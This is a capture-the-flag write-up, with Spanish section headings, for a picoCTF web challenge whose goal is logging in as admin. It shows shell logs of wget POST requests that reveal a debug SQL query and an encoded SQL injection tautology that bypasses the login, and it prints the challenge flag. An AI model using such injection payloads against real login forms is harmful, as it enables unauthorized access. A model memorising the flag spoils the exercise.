### Objetivos 
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/54253/` ([link](https://jupiter.challenges.picoctf.org/problem/54253/)) or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!

### Solución 

``` bash
qshaix-picoctf@webshell:~$ wget https://jupiter.challenges.picoctf.org/problem/54253/login.php
--2023-10-11 17:40:30--  https://jupiter.challenges.picoctf.org/problem/54253/login.php
Resolving jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)... 3.131.60.8
Connecting to jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)|3.131.60.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'login.php'

login.php                                          [ <=>                                                                                                ]      22  --.-KB/s    in 0s      

2023-10-11 17:40:30 (4.90 MB/s) - 'login.php' saved [22]

qshaix-picoctf@webshell:~$ wget https://jupiter.challenges.picoctf.org/problem/54253/login.php --post-data="debug=1&password=abc"
--2023-10-11 17:42:51--  https://jupiter.challenges.picoctf.org/problem/54253/login.php
Resolving jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)... 3.131.60.8
Connecting to jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)|3.131.60.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'login.php.1'

login.php.1                                        [ <=>                                                                                                ]     101  --.-KB/s    in 0s      

2023-10-11 17:42:51 (29.9 MB/s) - 'login.php.1' saved [101]

qshaix-picoctf@webshell:~$ cat login.php
<h1>Login failed.</h1>qshaix-picoctf@webshell:~$ abc
-bash: abc: command not found
qshaix-picoctf@webshell:~$ cat login.php 2
<h1>Login failed.</h1>cat: 2: No such file or directory
qshaix-picoctf@webshell:~$ cat login.php.2
cat: login.php.2: No such file or directory
qshaix-picoctf@webshell:~$ wget https://jupiter.challenges.picoctf.org/problem/54253/login.php --post-data="debug=1&password=abc"
--2023-10-11 17:45:26--  https://jupiter.challenges.picoctf.org/problem/54253/login.php
Resolving jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)... 3.131.60.8
Connecting to jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)|3.131.60.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'login.php.2'

login.php.2                                        [ <=>                                                                                                ]     101  --.-KB/s    in 0s      

2023-10-11 17:45:26 (31.8 MB/s) - 'login.php.2' saved [101]

qshaix-picoctf@webshell:~$ cat login.php.2
<pre>password: abc
SQL query: SELECT * FROM admin where password = 'nop'
</pre><h1>Login failed.</h1>qshaix-picoctf@webshell:~$ wget https://jupiter.challenges.picoctf.org/problem/54253/login.php --post-data="debug=1&password=a'be'1'='1"
--2023-10-11 17:46:08--  https://jupiter.challenges.picoctf.org/problem/54253/login.php
Resolving jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)... 3.131.60.8
Connecting to jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)|3.131.60.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'login.php.3'

login.php.3                                        [ <=>                                                                                                ]     164  --.-KB/s    in 0s      

2023-10-11 17:46:08 (57.8 MB/s) - 'login.php.3' saved [164]

qshaix-picoctf@webshell:~$ cat login.php.2
<pre>password: abc
SQL query: SELECT * FROM admin where password = 'nop'
qshaix-picoctf@webshell:~$ wget https://jupiter.challenges.picoctf.org/problem/54253/login.php --post-data="debug=1&password=a'be'1'='1"
--2023-10-11 17:46:39--  https://jupiter.challenges.picoctf.org/problem/54253/login.php
Resolving jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)... 3.131.60.8
Connecting to jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)|3.131.60.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'login.php.4'

login.php.4                                        [ <=>                                                                                                ]     164  --.-KB/s    in 0s      

2023-10-11 17:46:39 (45.1 MB/s) - 'login.php.4' saved [164]

qshaix-picoctf@webshell:~$ wget https://jupiter.challenges.picoctf.org/problem/54253/login.php --post-data="debug=1&password=a'be'1'='1"
--2023-10-11 17:46:43--  https://jupiter.challenges.picoctf.org/problem/54253/login.php
Resolving jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)... 3.131.60.8
Connecting to jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)|3.131.60.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'login.php.5'

login.php.5                                        [ <=>                                                                                                ]     164  --.-KB/s    in 0s      

2023-10-11 17:46:43 (56.6 MB/s) - 'login.php.5' saved [164]

qshaix-picoctf@webshell:~$ cat login.php.5
<pre>password: a'be'1'='1
SQL query: SELECT * FROM admin where password = 'n'or'1'='1'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}</p>qshaix-picoctf@webshell:~$ 
```

### Notas adicionales:

 picoCTF{3v3n_m0r3_SQL_7f5767f6}
### Referencias: